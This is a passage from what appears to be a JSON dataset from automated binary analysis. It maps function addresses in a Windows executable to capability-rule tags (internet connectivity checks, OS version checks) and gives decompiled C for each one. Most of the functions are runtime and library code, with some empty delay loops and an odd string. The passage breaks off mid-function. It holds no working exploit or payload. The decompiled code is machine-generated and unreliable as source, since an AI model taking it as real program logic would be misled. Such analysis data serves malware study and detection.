        "decompiled_code": "\nvoid __cdecl fcn.00402ec8(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t iVar3;\n    \n    LOCK();\n    *(arg_8h + 0xc) = *(arg_8h + 0xc) + 1;\n    piVar1 = *(arg_8h + 0x7c);\n    if (piVar1 != NULL) {\n        LOCK();\n        *piVar1 = *piVar1 + 1;\n    }\n    piVar1 = *(arg_8h + 0x84);\n    if (piVar1 != NULL) {\n        LOCK();\n        *piVar1 = *piVar1 + 1;\n    }\n    piVar1 = *(arg_8h + 0x80);\n    if (piVar1 != NULL) {\n        LOCK();\n        *piVar1 = *piVar1 + 1;\n    }\n    piVar1 = *(arg_8h + 0x8c);\n    if (piVar1 != NULL) {\n        LOCK();\n        *piVar1 = *piVar1 + 1;\n    }\n    ppiVar2 = arg_8h + 0x28;\n    iVar3 = 6;\n    do {\n        if ((ppiVar2[-2] != 0x571f60) && (piVar1 = *ppiVar2,  piVar1 != NULL)) {\n            LOCK();\n            *piVar1 = *piVar1 + 1;\n        }\n        if ((ppiVar2[-3] != NULL) && (piVar1 = ppiVar2[-1],  piVar1 != NULL)) {\n            LOCK();\n            *piVar1 = *piVar1 + 1;\n        }\n        ppiVar2 = ppiVar2 + 4;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    fcn.00402dd8(*(arg_8h + 0x9c));\n    return;\n}\n",
        "token_count": 448
    },
    "00402ecd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402ecd(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.004038a0(in_ECX + 0x464 + uVar1 * 0x10, 3, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 298
    },
    "00402edc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402edc(uint arg_8h)\n\n{\n    int32_t iStack36;\n    \n    for (iStack36 = 0x27; 0 < iStack36; iStack36 = iStack36 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    return;\n}\n",
        "token_count": 82
    },
    "00402eeb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402eeb(int32_t *arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t *in_ECX;\n    \n    if (*(in_ECX + 1) < '\\x02') {\n        arg_8h_00 = *arg_8h;\n        if (*in_ECX == 0) {\n            if (arg_8h_00 == 0) {\n                fcn.00402eb9(*(arg_8h + 1));\n            }\n            else {\n                *in_ECX = arg_8h_00;\n                in_ECX[1] = arg_8h[1];\n            }\n        }\n        else if (arg_8h_00 == 0) {\n            if (*(arg_8h + 1) != 0) {\n                fcn.0040658c(*(arg_8h + 1));\n            }\n        }\n        else {\n            fcn.004012c1(arg_8h_00);\n        }\n    }\n    return;\n}\n",
        "token_count": 229
    },
    "00402f4f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402f4f(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    int32_t in_ECX;\n    uint32_t var_4h;\n    \n    piVar2 = *(in_ECX + 0xc);\n    if (piVar2 == NULL) {\n        piVar2 = fcn.00403a35();\n        *(in_ECX + 0xc) = piVar2;\n    }\n    iVar1 = *piVar2;\n    *piVar2 = 0;\n    var_4h = 0;\n    uVar3 = fcn.00403675(*(in_ECX + 0x10) + -2, &var_4h, 10);\n    *arg_8h = uVar3;\n    piVar4 = *(in_ECX + 0xc);\n    if (piVar4 == NULL) {\n        piVar4 = fcn.00403a35();\n        *(in_ECX + 0xc) = piVar4;\n    }\n    if ((*piVar4 == 0x22) || (var_4h < *(in_ECX + 0x10))) {\n        uVar3 = 0;\n    }\n    else {\n        *(in_ECX + 0x10) = var_4h;\n        uVar3 = 1;\n    }\n    if ((*piVar2 == 0) && (iVar1 != 0)) {\n        *piVar2 = iVar1;\n    }\n    return uVar3;\n}\n",
        "token_count": 356
    },
    "00402fc2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402fc2(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n        uVar3 = *(*(in_ECX + 0x14) + -8);\n        arg_8h[1] = *(*(in_ECX + 0x14) + -4);\n        *arg_8h = uVar3;\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.004028c4(in_ECX + 0x464 + uVar1 * 0x10, 4, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        puVar2 = *(in_ECX + 0x46c + uVar1 * 0x10);\n        uVar3 = puVar2[1];\n        *arg_8h = *puVar2;\n        arg_8h[1] = uVar3;\n    }\n    return 1;\n}\n",
        "token_count": 365
    },
    "00403003": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00403003(uint32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t arg_ch;\n    int32_t iVar3;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = param_1;\n    if ((*(param_1 + 0x3c) == '\\0') && (iVar3 = 0,  0 < *(param_1 + 0x38))) {\n        arg_ch = *(param_1 + 0x34);\n        do {\n            var_4h = var_4h & 0xffff0000;\n            iVar2 = fcn.0040105a(&var_4h, arg_ch, *(**(param_1 + 8) + 4), *(param_1 + 8));\n            if (iVar2 < 1) {\n                *(param_1 + 0x18) = 0xffffffff;\n                return 1;\n            }\n            cVar1 = fcn.0040170d(var_4h);\n            if (cVar1 == '\\0') {\n                *(param_1 + 0x18) = 0xffffffff;\n            }\n            else {\n                *(param_1 + 0x18) = *(param_1 + 0x18) + 1;\n            }\n            arg_ch = arg_ch + iVar2;\n            iVar3 = iVar3 + 1;\n        } while (iVar3 != *(param_1 + 0x38));\n    }\n    else {\n        fcn.004040ed(*(param_1 + 0x34), *(param_1 + 0x38), param_1 + 0x18, param_1 + 0xc);\n    }\n    return 1;\n}\n",
        "token_count": 392
    },
    "0040301c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040301c(int32_t param_1)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    \n    if (*(param_1 + 4) != 0) {\n        iVar1 = *(param_1 + 8);\n        *(param_1 + 0xc) = iVar1;\n        while (iVar1 != 0) {\n            pcVar2 = *(param_1 + 4);\n            *(param_1 + 8) = **(param_1 + 0xc);\n            (**0x578000)(*(param_1 + 0xc));\n            (*pcVar2)();\n            iVar1 = *(param_1 + 8);\n            *(param_1 + 0xc) = iVar1;\n        }\n    }\n    return;\n}\n",
        "token_count": 174
    },
    "00403094": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint16_t * fcn.00403094(void)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    int16_t **ppiVar3;\n    int16_t *piVar4;\n    int16_t *piVar5;\n    int16_t *piVar6;\n    int32_t iVar7;\n    int16_t **ppiVar8;\n    int16_t *piVar9;\n    int32_t iVar10;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar7 = 0;\n    fcn.004058a8(0);\n    iVar10 = 7;\n    ppiVar3 = *(var_18h + 0x9c) + 0xd0;\n    ppiVar8 = ppiVar3;\n    do {\n        piVar6 = ppiVar8[-7];\n        piVar4 = piVar6 + 1;\n        do {\n            iVar1 = *piVar6;\n            piVar6 = piVar6 + 1;\n        } while (iVar1 != 0);\n        piVar5 = *ppiVar8;\n        piVar9 = piVar5 + 1;\n        do {\n            iVar1 = *piVar5;\n            piVar5 = piVar5 + 1;\n        } while (iVar1 != 0);\n        ppiVar8 = ppiVar8 + 1;\n        iVar7 = iVar7 + 2 + (piVar5 - piVar9 >> 1) + (piVar6 - piVar4 >> 1);\n        iVar10 = iVar10 + -1;\n    } while (iVar10 != 0);\n    piVar4 = fcn.0040409d(iVar7 * 2 + 2);\n    if (piVar4 == NULL) {\n        piVar4 = NULL;\n    }\n    else {\n        var_ch = 0;\n        piVar6 = piVar4;\n        do {\n            *piVar6 = 0x3a;\n            piVar9 = piVar6 + 1;\n            iVar10 = fcn.00403977(piVar9, (iVar7 - (piVar9 - piVar4 >> 1)) + 1, ppiVar3[-7]);\n            if (iVar10 != 0) {\ncode_r0x004be3b7:\n                fcn.0040366b(0, 0, 0, 0, 0);\n                pcVar2 = swi(3);\n                piVar4 = (*pcVar2)();\n                return piVar4;\n            }\n            piVar5 = piVar9;\n            do {\n                iVar1 = *piVar5;\n                piVar5 = piVar5 + 1;\n            } while (iVar1 != 0);\n            piVar9 = piVar9 + (piVar5 - (piVar6 + 2) >> 1);\n            *piVar9 = 0x3a;\n            piVar6 = piVar9 + 1;\n            iVar10 = fcn.00403977(piVar6, (iVar7 - (piVar6 - piVar4 >> 1)) + 1, *ppiVar3);\n            if (iVar10 != 0) goto code_r0x004be3b7;\n            piVar5 = piVar6;\n            do {\n                iVar1 = *piVar5;\n                piVar5 = piVar5 + 1;\n            } while (iVar1 != 0);\n            ppiVar3 = ppiVar3 + 1;\n            piVar6 = piVar6 + (piVar5 - (piVar9 + 2) >> 1);\n            var_ch = var_ch + 1;\n        } while (var_ch < 7);\n        *piVar6 = 0;\n    }\n    fcn.0040640b(0);\n    if (var_10h != '\\0') {\n        *(var_1ch + 0x350) = *(var_1ch + 0x350) & 0xfffffffd;\n    }\n    return piVar4;\n}\n",
        "token_count": 926
    },
    "00403111": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nushort __fastcall fcn.00403111(int32_t *param_1)\n\n{\n    code *pcVar1;\n    ushort uVar2;\n    \n    if ((*param_1[7] != NULL) && (0 < *param_1[0xb])) {\n        return **param_1[7];\n    }\n    pcVar1 = *(*param_1 + 0x18);\n    (**0x578000)();\n    uVar2 = (*pcVar1)();\n    return uVar2;\n}\n",
        "token_count": 108
    },
    "00403116": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_40h\n\nvoid __cdecl\nfcn.00403116(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint uVar4;\n    uint noname_0;\n    uint arg_10h_00;\n    uint arg_14h_00;\n    uint uVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint *puVar9;\n    int32_t arg_18h_00;\n    int32_t unaff_EBP;\n    char *pcVar10;\n    int32_t iVar11;\n    uint32_t arg_1ch_00;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.00405434(0x50);\n    uVar8 = *(unaff_EBP + 0x24);\n    iVar2 = *(unaff_EBP + 0x18);\n    pcVar10 = *(unaff_EBP + 0x20);\n    *(unaff_EBP + -0x54) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x58) = iVar2;\n    *(unaff_EBP + -0x44) = pcVar10;\n    if ((uVar8 == 0) || ((*pcVar10 != '+' && (*pcVar10 != '-')))) {\n        arg_1ch_00 = 0;\n    }\n    else {\n        arg_1ch_00 = 1;\n    }\n    if (((((*(iVar2 + 0x14) & 0xe00) == 0x800) && (arg_1ch_00 + 2 <= uVar8)) && (pcVar10[arg_1ch_00] == '0')) &&\n       ((pcVar10[arg_1ch_00 + 1] == 'x' || (pcVar10[arg_1ch_00 + 1] == 'X')))) {\n        arg_1ch_00 = arg_1ch_00 + 2;\n    }\n    fcn.004032d3(*(iVar2 + 0x30));\n    *(unaff_EBP + -4) = 0;\n    uVar5 = fcn.0040347c(unaff_EBP + -0x50);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x48) = uVar5;\n    fcn.00405146();\n    fcn.004055d8(uVar8, 0);\n    iVar11 = unaff_EBP + -0x28;\n    *(unaff_EBP + -4) = 1;\n    if (7 < *(unaff_EBP + -0x14)) {\n        iVar11 = *(unaff_EBP + -0x28);\n    }\n    fcn.00402c25(*(unaff_EBP + -0x44), uVar8 + *(unaff_EBP + -0x44), iVar11);\n    fcn.004032d3(*(iVar2 + 0x30));\n    *(unaff_EBP + -4) = 2;\n    piVar6 = fcn.00405466(unaff_EBP + -0x50);\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -0x44) = piVar6;\n    fcn.00405146();\n    pcVar3 = *(*piVar6 + 0x14);\n    (**0x578000)(unaff_EBP + -0x40);\n    (*pcVar3)();\n    pcVar10 = unaff_EBP + -0x40;\n    *(unaff_EBP + -4) = 3;\n    if (0xf < *(unaff_EBP + -0x2c)) {\n        pcVar10 = *(unaff_EBP + -0x40);\n    }\n    if ((*pcVar10 != '\\x7f') && ('\\0' < *pcVar10)) {\n        uVar7 = fcn.004017d0();\n        uVar7 = uVar7 & 0xffff;\n        *(unaff_EBP + -0x48) = uVar7;\n        while (((cVar1 = *pcVar10,  cVar1 != '\\x7f' && ('\\0' < cVar1)) && (cVar1 < uVar8 - arg_1ch_00))) {\n            uVar8 = uVar8 - cVar1;\n            fcn.00405a0b(uVar8, 1, uVar7);\n            if ('\\0' < pcVar10[1]) {\n                pcVar10 = pcVar10 + 1;\n            }\n            uVar7 = *(unaff_EBP + -0x48);\n        }\n    }\n    iVar2 = *(unaff_EBP + -0x58);\n    uVar8 = *(unaff_EBP + -0x18);\n    *(unaff_EBP + -0x48) = uVar8;\n    if (((*(iVar2 + 0x24) < 0) || ((*(iVar2 + 0x24) < 1 && (*(iVar2 + 0x20) == 0)))) || (*(iVar2 + 0x20) <= uVar8)) {\n        iVar11 = 0;\n    }\n    else {\n        iVar11 = *(iVar2 + 0x20) - uVar8;\n    }\n    uVar8 = *(iVar2 + 0x14) & 0x1c0;\n    if (uVar8 == 0x40) {\n        var_28h = unaff_EBP + -0x28;\n        if (7 < *(unaff_EBP + -0x14)) {\n            var_28h = *(unaff_EBP + -0x28);\n        }\n        var_2ch = *(unaff_EBP + 0x14);\n        uVar5 = *(unaff_EBP + 0x10);\n    }\n    else {\n        if (uVar8 == 0x100) {\n            arg_18h_00 = unaff_EBP + -0x28;\n            if (7 < *(unaff_EBP + -0x14)) {\n                arg_18h_00 = *(unaff_EBP + -0x28);\n            }\n            puVar9 = fcn.00404eb2(*(unaff_EBP + 8), unaff_EBP + -0x50, *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), \n                                  arg_18h_00, arg_1ch_00);\n            uVar5 = *puVar9;\n            uVar4 = puVar9[1];\n            *(unaff_EBP + 0x14) = uVar4;\n            *(unaff_EBP + 0x10) = uVar5;\n            puVar9 = fcn.004014b0(*(unaff_EBP + 8), unaff_EBP + -0x50, uVar5, uVar4, *(unaff_EBP + 0x1c), iVar11);\n            iVar11 = 0;\n            goto code_r0x00475e57;\n        }\n        puVar9 = fcn.004014b0(*(unaff_EBP + 8), unaff_EBP + -0x50, *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), \n                              *(unaff_EBP + 0x1c), iVar11);\n        iVar11 = 0;\n        uVar5 = *puVar9;\n        var_2ch = puVar9[1];\n        var_28h = unaff_EBP + -0x28;\n        *(unaff_EBP + 0x10) = uVar5;\n        *(unaff_EBP + 0x14) = var_2ch;\n        if (7 < *(unaff_EBP + -0x14)) {\n            var_28h = *(unaff_EBP + -0x28);\n        }\n    }\n    puVar9 = fcn.00404eb2(*(unaff_EBP + 8), unaff_EBP + -0x50, uVar5, var_2ch, var_28h, arg_1ch_00);\ncode_r0x00475e57:\n    uVar5 = puVar9[1];\n    uVar4 = *puVar9;\n    *(unaff_EBP + 0x10) = uVar4;\n    *(unaff_EBP + 0x14) = uVar5;\n    *(unaff_EBP + -0x44) = unaff_EBP + -0x28;\n    if (7 < *(unaff_EBP + -0x14)) {\n        *(unaff_EBP + -0x44) = *(unaff_EBP + -0x28);\n    }\n    noname_0 = *(unaff_EBP + 8);\n    puVar9 = fcn.00404eb2(noname_0, unaff_EBP + -0x5c, uVar4, uVar5, *(unaff_EBP + -0x44) + arg_1ch_00 * 2, \n                          *(unaff_EBP + -0x48) - arg_1ch_00);\n    uVar5 = *(unaff_EBP + 0x1c);\n    uVar4 = *(unaff_EBP + -0x54);\n    arg_10h_00 = *puVar9;\n    arg_14h_00 = puVar9[1];\n    *(iVar2 + 0x20) = 0;\n    *(iVar2 + 0x24) = 0;\n    *(unaff_EBP + 0x10) = arg_10h_00;\n    *(unaff_EBP + 0x14) = arg_14h_00;\n    fcn.004014b0(noname_0, uVar4, arg_10h_00, arg_14h_00, uVar5, iVar11);\n    fcn.00402a0e();\n    fcn.00405baf();\n    fcn.004068fc();\n    return;\n}\n",
        "token_count": 2503
    },
    "00403143": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __cdecl fcn.00403143(uint arg_8h)\n\n{\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_4h;\n    \n    for (var_ch = 0x2c; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    for (var_10h = 0x4c; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    for (var_14h = 0xe; 0 < var_14h; var_14h = var_14h + -1) {\n    }\n    fcn.00403b02(&stack0x00000008, &stack0x00000020);\n    fcn.00403b02();\n    return;\n}\n",
        "token_count": 237
    },
    "0040314d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040314d(code **param_1)\n\n{\n    uint32_t uVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x4e4da0;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x571ca8 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *param_1 = vtable.std::basic_filebuf_char__struct_std::char_traits_char__.0;\n    if (param_1[0x13] != NULL) {\n        fcn.0040373d(uVar1);\n    }\n    if (*(param_1 + 0x12) != '\\0') {\n        fcn.00405af6();\n    }\n    fcn.00405948();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 217
    },
    "0040317a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040317a(uint *arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    int32_t in_ECX;\n    char *pcVar1;\n    \n    if ((((*(in_ECX + 0x28) == '\\0') && (arg_ch < 3)) && (arg_10h < 2)) && (arg_14h < 5)) {\n        pcVar1 = \"+v$x+v$xv$+xv+$xv$+x+$vx+$vx$v+x+$vx$+vx+v $+v $v $+v +$v $++$ v+$ v$ v++$ v$+ v+xv$+ v$v$ +v+ $v$ ++x$v+ $v$v ++ $v$ +v\"\n                 + ((arg_10h + arg_ch * 2) * 5 + arg_14h) * 4;\n    }\n    else {\n        pcVar1 = \"$+xv\";\n    }\n    *arg_8h = *pcVar1;\n    return;\n}\n",
        "token_count": 248
    },
    "0040319d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.0040319d(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_ECX;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    var_14h = 0;\n    var_10h = 0;\n    fcn.00401fd7(&var_ch, arg_8h, &var_14h, in_ECX + 0x18);\n    fcn.004030bc(var_14h);\n    return;\n}\n",
        "token_count": 160
    },
    "004031c5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004031c5(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack68;\n    int32_t iStack64;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x450200;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    for (iStack64 = 0x61; 0 < iStack64; iStack64 = iStack64 + -1) {\n    }\n    for (iStack68 = 0x1f; 0 < iStack68; iStack68 = iStack68 + -1) {\n    }\n    uStack24 = 0;\n    fcn.00401e79(\"chwrxwezomyfm\");\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 249
    },
    "004031fc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.004031fc(int32_t *arg_8h, int32_t *arg_ch, uchar *arg_10h, int32_t arg_14h)\n\n{\n    char *pcVar1;\n    uint arg_ch_00;\n    int32_t *piVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    uint32_t arg_8h_00;\n    uint var_18h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    pcVar3 = *0x574458 + 1;\n    var_10h = 0;\n    iVar4 = *pcVar3;\n    var_8h = 0;\n    var_ch = 0;\n    var_4h = 0;\n    if (iVar4 == 0x41) {\n        *0x574458 = pcVar3;\n        if (arg_14h == 0) {\n            if ((*arg_ch == 2) || (*arg_ch == 3)) {\n                *arg_ch = 5;\n            }\n            else if (*arg_ch == 1) {\n                *arg_ch = 4;\n            }\n        }\ncode_r0x0048f795:\n        *0x574458 = *0x574458 + 1;\n        arg_8h[1] = 0;\n    }\n    else {\n        if (iVar4 == 0x42) {\n            if (arg_14h == 0) {\n                *0x574458 = pcVar3;\n                *arg_10h = 1;\n                fcn.00404557(0x3e);\n                goto code_r0x0048f795;\n            }\n        }\n        else {\n            if (iVar4 == 0x43) {\n                *0x574458 = pcVar3;\n                *arg_ch = 5;\n                goto code_r0x0048f795;\n            }\n            if ((*pcVar3 == '\\0') || (pcVar1 = *0x574458 + 2,  *pcVar1 == '\\0')) {\n                *0x574458 = pcVar3;\n                fcn.004017df(1);\n                return arg_8h;\n            }\n            if (arg_14h == 0) {\n                *0x574458 = *0x574458 + 3;\n                arg_8h_00 = *pcVar1 + -0x30 + (iVar4 + -0x30) * 0x10;\n                if (1 < arg_8h_00) {\n                    fcn.00404557(0x2c);\n                    arg_ch_00 = fcn.0040127b(arg_8h_00, 0);\n                    piVar2 = fcn.004053b7(&var_18h, arg_ch_00);\n                    var_10h = *piVar2;\n                    var_ch = piVar2[1];\n                }\n                fcn.00403d55(0x3e);\n                var_8h = var_10h;\n                var_4h = var_ch;\n                if (**0x574458 == '$') {\n                    *0x574458 = *0x574458 + 1;\n                }\n                else {\n                    fcn.00403d55(0x5e);\n                }\n                if (**0x574458 == '\\0') {\n                    if (var_ch < '\\x02') {\n                        var_8h = var_10h;\n                        var_4h = var_ch;\n                        if (var_10h == 0) {\n                            fcn.00402eb9(1);\n                            var_ch = var_4h;\n                            var_10h = var_8h;\n                        }\n                        else {\n                            fcn.00405713(0x555dd8);\n                            var_ch = var_4h;\n                            var_10h = var_8h;\n                        }\n                    }\n                }\n                else {\n                    *0x574458 = *0x574458 + 1;\n                }\n                *arg_8h = var_10h;\n                arg_8h[1] = var_ch | 0x4000;\n                return arg_8h;\n            }\n        }\n        